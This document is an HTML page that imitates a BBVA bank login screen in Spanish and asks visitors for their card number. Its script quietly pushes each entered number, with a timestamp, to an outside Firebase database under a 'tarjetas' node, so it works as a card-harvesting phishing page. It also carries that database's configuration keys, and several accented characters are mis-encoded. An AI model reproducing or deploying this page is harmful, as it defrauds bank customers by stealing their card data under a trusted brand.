
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BBVA - Acceso</title>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #fff;
    }

    .navbar {
      background-color: #001b44;
      color: white;
      padding: 10px 15px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
    }

    .navbar .left, .navbar .right {
      display: flex;
      align-items: center;
      flex-wrap: wrap;
    }

    .navbar .left div,
    .navbar .right div {
      margin: 5px 10px;
      color: #ccc;
      cursor: pointer;
      font-size: 14px;
    }

    .navbar .left div:first-child {
      font-weight: bold;
      font-size: 20px;
      color: white;
    }

    .navbar .right .btn {
      background-color: #0097a9;
      padding: 6px 12px;
      border-radius: 3px;
      color: white;
      margin-left: 10px;
      font-size: 14px;
    }

    .main {
      text-align: center;
      margin-top: 50px;
      padding: 0 15px;
    }

    h1 {
      font-size: 24px;
    }

    .input-box {
      margin-top: 30px;
    }

    input[type="number"] {
      width: 100%;
      max-width: 300px;
      padding: 12px;
      font-size: 16px;
      border: none;
      border-bottom: 2px solid #000;
      background-color: #f4f4f4;
    }

    .btn-blue {
      background-color: #0073cf;
      color: white;
      border: none;
      padding: 10px 20px;
      margin-top: 20px;
      cursor: pointer;
      font-size: 16px;
      width: 100%;
      max-width: 300px;
    }

    .register-link {
      display: block;
      margin-top: 15px;
      color: #0073cf;
      text-decoration: none;
      font-weight: bold;
    }

    .close-btn {
      position: absolute;
      top: 20px;
      right: 20px;
      font-size: 24px;
    }

    @media (max-width: 480px) {
      .navbar {
        flex-direction: column;
        align-items: flex-start;
      }

      .navbar .left, .navbar .right {
        flex-direction: column;
        align-items: flex-start;
        width: 100%;
      }

      .navbar .left div,
      .navbar .right div {
        font-size: 16px;
      }

      .main {
        margin-top: 30px;
      }

      .btn-blue {
        font-size: 18px;
      }
    }
  </style>
</head>
<body>

  <div class="navbar">
    <div class="left">
      <div>BBVA</div>
      <div>PERSONAS</div>
      <div>EMPRESAS Y GOBIERNO</div>
      <div>PYME</div>
    </div>
    <div class="right">
      <div style="color: #ffc107;">üë§ Hazte cliente</div>
      <div class="btn">Acceso</div>
      <div>üîç</div>
      <div>Men√∫ ‚ò∞</div>
    </div>
  </div>

  <div class="main">
    <h1>¬°Bienvenido!</h1>
    <div class="input-box">
      <input type="number" id="numeroTarjeta" placeholder="N√∫mero de Tarjeta" onkeydown="if(event.key==='Enter'){enviarDatos()}">
    </div>
    <button class="btn-blue" onclick="enviarDatos()">Continuar</button>
    <a href="#" class="register-link">¬°Reg√≠strate!</a>
    <div class="close-btn">‚úï</div>
  </div>

  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDmdgKOzKwkDu4llQtI6Pxv6-sUytyZ19Q",
      authDomain: "epic-1dd5a.firebaseapp.com",
      databaseURL: "https://epic-1dd5a-default-rtdb.firebaseio.com",
      projectId: "epic-1dd5a",
      storageBucket: "epic-1dd5a.firebasestorage.app",
      messagingSenderId: "344159148945",
      appId: "1:344159148945:web:320432d62fd717890b1830"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function enviarDatos() {
      const numero = document.getElementById("numeroTarjeta").value;
      if (numero.trim() === "") {
        alert("Por favor ingresa un n√∫mero de tarjeta.");
        return;
      }
      const ref = db.ref("tarjetas").push();
      ref.set({
        numero: numero,
        timestamp: new Date().toISOString()
      }).then(() => {
        alert("N√∫mero enviado correctamente.");
        document.getElementById("numeroTarjeta").value = "";
      }).catch((error) => {
        alert("Error al enviar: " + error);
      });
    }
  </script>
</body>
</html>
